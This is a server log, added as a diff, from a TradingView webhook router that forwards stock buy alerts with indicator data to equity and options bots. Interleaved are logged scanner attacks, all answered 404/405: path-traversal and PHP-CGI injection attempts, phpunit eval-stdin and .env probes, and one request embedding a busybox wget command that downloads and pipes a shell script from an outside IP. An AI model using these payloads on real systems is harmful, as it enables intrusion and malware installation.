@@ -1,0 +1,621 @@
+2025-12-02 06:44:23,498 - __main__ - INFO - 
+======================================================================
+2025-12-02 06:44:23,500 - __main__ - INFO - 🚀 TRADINGVIEW WEBHOOK ROUTER STARTING
+2025-12-02 06:44:23,500 - __main__ - INFO - ======================================================================
+2025-12-02 06:44:23,500 - __main__ - INFO - Listening on: http://0.0.0.0:80
+2025-12-02 06:44:23,500 - __main__ - INFO - Equity bot endpoint: http://127.0.0.1:8080/webhook
+2025-12-02 06:44:23,500 - __main__ - INFO - Options bot endpoint: http://127.0.0.1:8081/webhook/options
+2025-12-02 06:44:23,500 - __main__ - INFO - Authentication: DISABLED
+2025-12-02 06:44:23,500 - __main__ - INFO - ======================================================================
+
+2025-12-02 06:44:23,512 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://143.244.141.127:80
+2025-12-02 06:44:23,513 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-12-02 06:52:26,299 - werkzeug - INFO - 78.153.140.148 - - [02/Dec/2025 06:52:26] "[33mGET /.env HTTP/1.1[0m" 404 -
+2025-12-02 06:52:26,675 - werkzeug - INFO - 78.153.140.148 - - [02/Dec/2025 06:52:26] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+2025-12-02 06:54:35,861 - werkzeug - INFO - 103.252.89.75 - - [02/Dec/2025 06:54:35] "GET / HTTP/1.1" 200 -
+2025-12-02 07:06:04,707 - werkzeug - INFO - 79.124.40.86 - - [02/Dec/2025 07:06:04] "HEAD / HTTP/1.0" 200 -
+2025-12-02 07:07:41,746 - werkzeug - INFO - 185.242.226.112 - - [02/Dec/2025 07:07:41] "GET / HTTP/1.1" 200 -
+2025-12-02 07:36:40,763 - werkzeug - INFO - 193.142.147.209 - - [02/Dec/2025 07:36:40] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+2025-12-02 08:04:22,145 - werkzeug - INFO - 147.93.5.191 - - [02/Dec/2025 08:04:22] "[33mGET /index.php HTTP/1.1[0m" 404 -
+2025-12-02 08:04:22,574 - werkzeug - INFO - 147.93.5.191 - - [02/Dec/2025 08:04:22] "[33mGET /index.php HTTP/1.1[0m" 404 -
+2025-12-02 08:26:43,595 - werkzeug - INFO - 45.235.178.103 - - [02/Dec/2025 08:26:43] "GET / HTTP/1.1" 200 -
+2025-12-02 08:28:11,390 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:11] "[33mPOST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1[0m" 404 -
+2025-12-02 08:28:15,157 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:15] "[33mPOST /cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1[0m" 404 -
+2025-12-02 08:28:20,615 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:20] "[33mPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 404 -
+2025-12-02 08:28:21,943 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:21] "[31m[1mPOST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1[0m" 405 -
+2025-12-02 08:28:26,365 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:26] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:33,458 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:33] "[33mGET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:33,777 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:33] "[33mGET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:34,083 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:34] "[33mGET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:35,394 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:35] "[33mGET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:46,693 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:46] "[33mGET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:47,012 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:47] "[33mGET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:47,272 - werkzeug - INFO - 65.49.1.202 - - [02/Dec/2025 08:28:47] "GET / HTTP/1.1" 200 -
+2025-12-02 08:28:50,441 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:50] "[33mGET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:52,799 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:52] "[33mGET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:53,094 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:53] "[33mGET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:56,438 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:56] "[33mGET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:56,719 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:56] "[33mGET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:28:59,074 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:28:59] "[33mGET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:02,512 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:02] "[33mGET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:03,859 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:03] "[33mGET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:09,127 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:09] "[33mGET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:39,839 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:39] "[33mGET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:40,146 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:40] "[33mGET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:41,514 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:41] "[33mGET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:42,858 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:42] "[33mGET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:29:43,166 - werkzeug - INFO - 91.108.245.40 - - [02/Dec/2025 08:29:43] "[33mGET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+2025-12-02 08:32:11,400 - werkzeug - INFO - 65.49.1.203 - - [02/Dec/2025 08:32:11] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2025-12-02 08:32:44,303 - werkzeug - INFO - 65.49.1.202 - - [02/Dec/2025 08:32:44] "[33mGET /geoserver/web/ HTTP/1.1[0m" 404 -
+2025-12-02 08:50:22,117 - __main__ - INFO - 
+======================================================================
+2025-12-02 08:50:22,119 - __main__ - INFO - 🚀 TRADINGVIEW WEBHOOK ROUTER STARTING
+2025-12-02 08:50:22,119 - __main__ - INFO - ======================================================================
+2025-12-02 08:50:22,119 - __main__ - INFO - Listening on: http://0.0.0.0:80
+2025-12-02 08:50:22,119 - __main__ - INFO - Equity bot endpoint: http://127.0.0.1:8080/webhook
+2025-12-02 08:50:22,119 - __main__ - INFO - Options bot endpoint: http://127.0.0.1:8081/webhook/options
+2025-12-02 08:50:22,119 - __main__ - INFO - Authentication: DISABLED
+2025-12-02 08:50:22,119 - __main__ - INFO - ======================================================================
+
+2025-12-02 08:50:22,156 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://143.244.141.127:80
+2025-12-02 08:50:22,156 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-12-02 08:50:57,209 - werkzeug - INFO - 129.226.93.214 - - [02/Dec/2025 08:50:57] "GET / HTTP/1.1" 200 -
+2025-12-02 09:16:40,917 - werkzeug - INFO - 64.23.208.64 - - [02/Dec/2025 09:16:40] "[33mGET /.env HTTP/1.1[0m" 404 -
+2025-12-02 09:16:41,344 - werkzeug - INFO - 64.23.208.64 - - [02/Dec/2025 09:16:41] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+2025-12-02 09:16:50,920 - werkzeug - ERROR - 172.236.228.245 - - [02/Dec/2025 09:16:50] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+2025-12-02 09:16:50,920 - werkzeug - INFO - 172.236.228.245 - - [02/Dec/2025 09:16:50] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+2025-12-02 09:16:52,567 - werkzeug - ERROR - 172.236.228.245 - - [02/Dec/2025 09:16:52] code 400, message Bad request syntax ('\x16\x03\x01\x01')
+2025-12-02 09:16:52,567 - werkzeug - INFO - 172.236.228.245 - - [02/Dec/2025 09:16:52] "[31m[1m\x16\x03\x01\x01[0m" 400 -
+2025-12-02 09:32:50,242 - werkzeug - INFO - 192.159.99.95 - - [02/Dec/2025 09:32:50] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=`busybox%20wget%20-qO-%20http://70.184.13.47/rondo.zqq.sh|sh` HTTP/1.1[0m" 404 -
+2025-12-02 09:39:34,602 - werkzeug - INFO - 78.153.140.148 - - [02/Dec/2025 09:39:34] "[33mGET /.env HTTP/1.1[0m" 404 -
+2025-12-02 09:39:34,985 - werkzeug - INFO - 78.153.140.148 - - [02/Dec/2025 09:39:34] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+2025-12-02 09:43:15,390 - werkzeug - INFO - 147.185.133.170 - - [02/Dec/2025 09:43:15] "GET / HTTP/1.1" 200 -
+2025-12-02 09:43:58,865 - werkzeug - ERROR - 185.242.226.112 - - [02/Dec/2025 09:43:58] code 400, message Bad request version ('À\x14À')
+2025-12-02 09:43:58,865 - werkzeug - INFO - 185.242.226.112 - - [02/Dec/2025 09:43:58] "[31m[1m\x16\x03\x01\x00\x8d\x01\x00\x00\x89\x03\x03\x8aucD\x17í¶\x8bº\x97,7\x1563+Å¼¬+.NdPLû\x8c0\x1d\x90|¾\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" 400 -
+2025-12-02 09:44:51,640 - werkzeug - INFO - 79.124.40.174 - - [02/Dec/2025 09:44:51] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+2025-12-02 09:54:01,784 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 09:54:01,784 - __main__ - INFO - 
+======================================================================
+2025-12-02 09:54:01,784 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#1)
+2025-12-02 09:54:01,784 - __main__ - INFO - ======================================================================
+2025-12-02 09:54:01,784 - __main__ - INFO - Symbol: ANGELONE
+2025-12-02 09:54:01,784 - __main__ - INFO - Action: BUY
+2025-12-02 09:54:01,784 - __main__ - INFO - Price: 2805.00
+2025-12-02 09:54:01,785 - __main__ - INFO - Timestamp: 2025-12-02T09:54:01.785002
+2025-12-02 09:54:01,785 - __main__ - INFO - Payload: {
+  "symbol": "ANGELONE",
+  "action": "BUY",
+  "price": "2805.00",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "2780.95",
+  "rsi": "80.05",
+  "atr": "9.05",
+  "adx": "31.40",
+  "volume": "42998.00",
+  "ema9": "2780.50",
+  "ema20": "2769.95",
+  "pdh": "2776.00",
+  "ema_gap_pct": "0.90",
+  "vwap_lead_pct": "0.85",
+  "atr_pct": "0.30",
+  "vol_z": "1.80",
+  "z_rsi": "1.70",
+  "heat_ok": "1.00",
+  "body_ratio": "0.60",
+  "open_gap_pct": "0.05",
+  "hl_range_pct": "0.75",
+  "pc_lead_pct": "0.50",
+  "close_to_high": "71.10",
+  "atr_jump": "0.05",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 09:54:01,785 - __main__ - INFO - ======================================================================
+
+2025-12-02 09:54:01,785 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 09:54:01,807 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 09:54:01,817 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 09:54:01,818 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 09:54:01,818 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 09:54:01] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 09:57:01,368 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 09:57:01,368 - __main__ - INFO - 
+======================================================================
+2025-12-02 09:57:01,369 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#2)
+2025-12-02 09:57:01,369 - __main__ - INFO - ======================================================================
+2025-12-02 09:57:01,369 - __main__ - INFO - Symbol: BALKRISIND
+2025-12-02 09:57:01,369 - __main__ - INFO - Action: BUY
+2025-12-02 09:57:01,369 - __main__ - INFO - Price: 2376.90
+2025-12-02 09:57:01,369 - __main__ - INFO - Timestamp: 2025-12-02T09:57:01.369226
+2025-12-02 09:57:01,369 - __main__ - INFO - Payload: {
+  "symbol": "BALKRISIND",
+  "action": "BUY",
+  "price": "2376.90",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "2361.00",
+  "rsi": "82.20",
+  "atr": "10.50",
+  "adx": "48.00",
+  "volume": "13478.00",
+  "ema9": "2355.15",
+  "ema20": "2337.10",
+  "pdh": "2322.90",
+  "ema_gap_pct": "0.90",
+  "vwap_lead_pct": "0.65",
+  "atr_pct": "0.45",
+  "vol_z": "1.05",
+  "z_rsi": "0.40",
+  "heat_ok": "1.00",
+  "body_ratio": "0.75",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "1.20",
+  "pc_lead_pct": "0.90",
+  "close_to_high": "89.00",
+  "atr_jump": "0.05",
+  "ultra_pass": "0.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 09:57:01,369 - __main__ - INFO - ======================================================================
+
+2025-12-02 09:57:01,369 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 09:57:01,388 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 09:57:01,398 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 09:57:01,398 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 09:57:01,399 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 09:57:01] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:02:32,210 - werkzeug - INFO - 79.124.40.86 - - [02/Dec/2025 10:02:32] "HEAD / HTTP/1.0" 200 -
+2025-12-02 10:03:33,828 - werkzeug - INFO - 193.142.147.209 - - [02/Dec/2025 10:03:33] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+2025-12-02 10:12:01,611 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:12:01,612 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:12:01,612 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#3)
+2025-12-02 10:12:01,612 - __main__ - INFO - ======================================================================
+2025-12-02 10:12:01,612 - __main__ - INFO - Symbol: CYIENT
+2025-12-02 10:12:01,612 - __main__ - INFO - Action: BUY
+2025-12-02 10:12:01,612 - __main__ - INFO - Price: 1175.00
+2025-12-02 10:12:01,612 - __main__ - INFO - Timestamp: 2025-12-02T10:12:01.612492
+2025-12-02 10:12:01,612 - __main__ - INFO - Payload: {
+  "symbol": "CYIENT",
+  "action": "BUY",
+  "price": "1175.00",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "1165.70",
+  "rsi": "71.20",
+  "atr": "3.85",
+  "adx": "37.20",
+  "volume": "29832.00",
+  "ema9": "1165.05",
+  "ema20": "1163.15",
+  "pdh": "1167.50",
+  "ema_gap_pct": "0.85",
+  "vwap_lead_pct": "0.80",
+  "atr_pct": "0.35",
+  "vol_z": "2.30",
+  "z_rsi": "1.15",
+  "heat_ok": "1.00",
+  "body_ratio": "0.80",
+  "open_gap_pct": "0.05",
+  "hl_range_pct": "0.95",
+  "pc_lead_pct": "0.80",
+  "close_to_high": "86.50",
+  "atr_jump": "0.05",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:12:01,612 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:12:01,612 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:12:01,632 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:12:01,643 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:12:01,643 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:12:01,643 - werkzeug - INFO - 34.212.75.30 - - [02/Dec/2025 10:12:01] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:27:02,274 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:27:02,289 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:27:02,289 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#4)
+2025-12-02 10:27:02,289 - __main__ - INFO - ======================================================================
+2025-12-02 10:27:02,289 - __main__ - INFO - Symbol: BSOFT
+2025-12-02 10:27:02,290 - __main__ - INFO - Action: BUY
+2025-12-02 10:27:02,290 - __main__ - INFO - Price: 400.40
+2025-12-02 10:27:02,290 - __main__ - INFO - Timestamp: 2025-12-02T10:27:02.290833
+2025-12-02 10:27:02,295 - __main__ - INFO - Payload: {
+  "symbol": "BSOFT",
+  "action": "BUY",
+  "price": "400.40",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "395.55",
+  "rsi": "78.10",
+  "atr": "2.00",
+  "adx": "53.95",
+  "volume": "271794.00",
+  "ema9": "396.45",
+  "ema20": "393.40",
+  "pdh": "386.90",
+  "ema_gap_pct": "1.00",
+  "vwap_lead_pct": "1.25",
+  "atr_pct": "0.50",
+  "vol_z": "3.85",
+  "z_rsi": "0.95",
+  "heat_ok": "1.00",
+  "body_ratio": "0.75",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "1.05",
+  "pc_lead_pct": "0.80",
+  "close_to_high": "77.65",
+  "atr_jump": "0.05",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:27:02,296 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:27:02,299 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:27:02,420 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:27:02,445 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:27:02,446 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:27:02,467 - werkzeug - INFO - 34.212.75.30 - - [02/Dec/2025 10:27:02] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:36:01,278 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:36:01,278 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:36:01,278 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#5)
+2025-12-02 10:36:01,278 - __main__ - INFO - ======================================================================
+2025-12-02 10:36:01,278 - __main__ - INFO - Symbol: PGEL
+2025-12-02 10:36:01,278 - __main__ - INFO - Action: BUY
+2025-12-02 10:36:01,278 - __main__ - INFO - Price: 594.30
+2025-12-02 10:36:01,278 - __main__ - INFO - Timestamp: 2025-12-02T10:36:01.278493
+2025-12-02 10:36:01,278 - __main__ - INFO - Payload: {
+  "symbol": "PGEL",
+  "action": "BUY",
+  "price": "594.30",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "593.10",
+  "rsi": "58.60",
+  "atr": "1.30",
+  "adx": "23.15",
+  "volume": "82118.00",
+  "ema9": "593.05",
+  "ema20": "592.90",
+  "pdh": "597.65",
+  "ema_gap_pct": "0.20",
+  "vwap_lead_pct": "0.20",
+  "atr_pct": "0.20",
+  "vol_z": "4.20",
+  "z_rsi": "1.65",
+  "heat_ok": "1.00",
+  "body_ratio": "0.75",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "0.40",
+  "pc_lead_pct": "0.30",
+  "close_to_high": "91.85",
+  "atr_jump": "0.00",
+  "ultra_pass": "0.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:36:01,278 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:36:01,278 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:36:01,290 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:36:01,303 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:36:01,304 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:36:01,304 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 10:36:01] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:39:01,720 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:39:01,721 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:39:01,722 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#6)
+2025-12-02 10:39:01,722 - __main__ - INFO - ======================================================================
+2025-12-02 10:39:01,722 - __main__ - INFO - Symbol: PAGEIND
+2025-12-02 10:39:01,722 - __main__ - INFO - Action: BUY
+2025-12-02 10:39:01,723 - __main__ - INFO - Price: 37380.00
+2025-12-02 10:39:01,724 - __main__ - INFO - Timestamp: 2025-12-02T10:39:01.724125
+2025-12-02 10:39:01,724 - __main__ - INFO - Payload: {
+  "symbol": "PAGEIND",
+  "action": "BUY",
+  "price": "37380.00",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "37227.90",
+  "rsi": "67.05",
+  "atr": "60.70",
+  "adx": "28.35",
+  "volume": "478.00",
+  "ema9": "37273.85",
+  "ema20": "37263.50",
+  "pdh": "38350.00",
+  "ema_gap_pct": "0.30",
+  "vwap_lead_pct": "0.40",
+  "atr_pct": "0.15",
+  "vol_z": "1.60",
+  "z_rsi": "2.70",
+  "heat_ok": "1.00",
+  "body_ratio": "0.70",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "0.40",
+  "pc_lead_pct": "0.30",
+  "close_to_high": "75.85",
+  "atr_jump": "0.00",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:39:01,724 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:39:01,725 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:39:01,743 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:39:01,776 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:39:01,778 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:39:01,779 - werkzeug - INFO - 34.212.75.30 - - [02/Dec/2025 10:39:01] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:39:04,314 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:39:04,315 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:39:04,315 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#7)
+2025-12-02 10:39:04,316 - __main__ - INFO - ======================================================================
+2025-12-02 10:39:04,316 - __main__ - INFO - Symbol: SJVN
+2025-12-02 10:39:04,316 - __main__ - INFO - Action: BUY
+2025-12-02 10:39:04,316 - __main__ - INFO - Price: 78.14
+2025-12-02 10:39:04,316 - __main__ - INFO - Timestamp: 2025-12-02T10:39:04.316638
+2025-12-02 10:39:04,316 - __main__ - INFO - Payload: {
+  "symbol": "SJVN",
+  "action": "BUY",
+  "price": "78.14",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "77.73",
+  "rsi": "67.32",
+  "atr": "0.16",
+  "adx": "25.13",
+  "volume": "78622.00",
+  "ema9": "77.82",
+  "ema20": "77.76",
+  "pdh": "79.00",
+  "ema_gap_pct": "0.41",
+  "vwap_lead_pct": "0.53",
+  "atr_pct": "0.21",
+  "vol_z": "3.30",
+  "z_rsi": "2.07",
+  "heat_ok": "1.00",
+  "body_ratio": "0.96",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "0.32",
+  "pc_lead_pct": "0.31",
+  "close_to_high": "96.00",
+  "atr_jump": "0.01",
+  "ultra_pass": "0.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:39:04,317 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:39:04,317 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:39:04,326 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:39:04,341 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
+2025-12-02 10:39:04,341 - __main__ - INFO - ✓ Alert successfully forwarded to BOTH bots
+2025-12-02 10:39:04,342 - werkzeug - INFO - 52.32.178.7 - - [02/Dec/2025 10:39:04] "POST /webhook HTTP/1.1" 200 -
+2025-12-02 10:42:03,444 - __main__ - INFO - ℹ️ Extracted alert from TradingView Alerts wrapper
+2025-12-02 10:42:03,445 - __main__ - INFO - 
+======================================================================
+2025-12-02 10:42:03,445 - __main__ - INFO - 📨 WEBHOOK ALERT RECEIVED (#8)
+2025-12-02 10:42:03,445 - __main__ - INFO - ======================================================================
+2025-12-02 10:42:03,445 - __main__ - INFO - Symbol: GLENMARK
+2025-12-02 10:42:03,445 - __main__ - INFO - Action: BUY
+2025-12-02 10:42:03,445 - __main__ - INFO - Price: 1962.10
+2025-12-02 10:42:03,445 - __main__ - INFO - Timestamp: 2025-12-02T10:42:03.445386
+2025-12-02 10:42:03,445 - __main__ - INFO - Payload: {
+  "symbol": "GLENMARK",
+  "action": "BUY",
+  "price": "1962.10",
+  "score": "100.00",
+  "confidence": "95.00",
+  "verdict": "1.00",
+  "vwap": "1952.75",
+  "rsi": "68.70",
+  "atr": "4.05",
+  "adx": "34.10",
+  "volume": "18095.00",
+  "ema9": "1956.20",
+  "ema20": "1952.85",
+  "pdh": "1965.90",
+  "ema_gap_pct": "0.30",
+  "vwap_lead_pct": "0.50",
+  "atr_pct": "0.20",
+  "vol_z": "3.10",
+  "z_rsi": "0.80",
+  "heat_ok": "1.00",
+  "body_ratio": "0.65",
+  "open_gap_pct": "0.00",
+  "hl_range_pct": "0.30",
+  "pc_lead_pct": "0.20",
+  "close_to_high": "85.70",
+  "atr_jump": "0.00",
+  "ultra_pass": "1.00",
+  "above_vwap": "1.00",
+  "time_ok": "1.00",
+  "resistance_break": "1.00",
+  "vol_quality": "1.00"
+}
+2025-12-02 10:42:03,445 - __main__ - INFO - ======================================================================
+
+2025-12-02 10:42:03,445 - __main__ - INFO - 🔄 Forwarding alert to both bots...
+2025-12-02 10:42:03,455 - __main__ - INFO - ✓ Alert forwarded to EQUITY BOT: 200
+2025-12-02 10:42:03,467 - __main__ - INFO - ✓ Alert forwarded to OPTIONS BOT: 200
